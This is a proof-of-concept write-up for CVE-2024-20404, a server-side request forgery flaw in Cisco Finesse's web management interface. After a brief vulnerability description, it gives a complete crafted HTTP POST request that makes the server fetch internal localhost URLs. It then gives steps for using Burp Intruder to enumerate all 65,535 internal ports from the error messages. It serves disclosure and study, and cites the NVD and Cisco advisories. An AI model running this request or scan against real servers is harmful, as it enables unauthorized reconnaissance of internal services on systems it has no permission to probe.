## Description

A vulnerability in the web-based management interface of Cisco Finesse could allow an unauthenticated, remote attacker to conduct an SSRF attack on an affected system.

This vulnerability is due to insufficient validation of user-supplied input for specific HTTP requests that are sent to an affected system. An attacker could exploit this vulnerability by sending a crafted HTTP request to the affected device. A successful exploit could allow the attacker to obtain limited sensitive information for services that are associated to the affected device.



## Proof of Concept (PoC)

1. Send the below request to check the response from the port number "8444" on the localhost of the server after replacing the `<target>` of yours.

```HTTP
POST /gadgets/metadata HTTP/2
Host: <target>:8445
Cookie: timeBeforeFailover=1695808242310; timeBeforeAttemptingLoginInIframe=1695808244317; attemptsMade=1; seqNumberGenerated=1; finesse_ag_extension=<extension>; activeDeviceId4000=SEPD4AD717A03F6; timeBeforeLoadingOtherSide=1695808249678
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://<target>:8445/desktop/container;jsessionid=90aE172355707490406528141464742B/?locale=en_US
Content-Type: application/json
Content-Length: 127
Origin: https://<target>:8445
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"context":{"container":"default","language":"en","country":"US","locale":"en_US"},"gadgets":[{"url":"http://127.0.0.1:8444"}]}
```

![](screenshots/Pasted%20image%2020240609205940.png)

2. Use the burp suite intruder to scan all the open ports on the Cisco Finesse web-based management server, by changing the port number from 1-65535.

3. You will see the response "Connection refused" on the closed ports.

![](screenshots/Pasted%20image%2020240609210322.png)

4. The other error messages indicate that these ports are open, and they can be enumerated.

![](screenshots/Pasted%20image%2020240609210501.png)



## References

- [https://nvd.nist.gov/vuln/detail/CVE-2024-20404](https://nvd.nist.gov/vuln/detail/CVE-2024-20404)
- [https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-finesse-ssrf-rfi-Um7wT8Ew](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-finesse-ssrf-rfi-Um7wT8Ew)



## Disclaimer

This is just a Proof of Concept (PoC) to demonstrate that the Cisco Finesse web-based management interface is vulnerable to Server Side Request Forgery (SSRF), and this PoC is for educational purposes only. Use it responsibly and only on systems with explicit permission to test. Misuse of this PoC can result in severe consequences.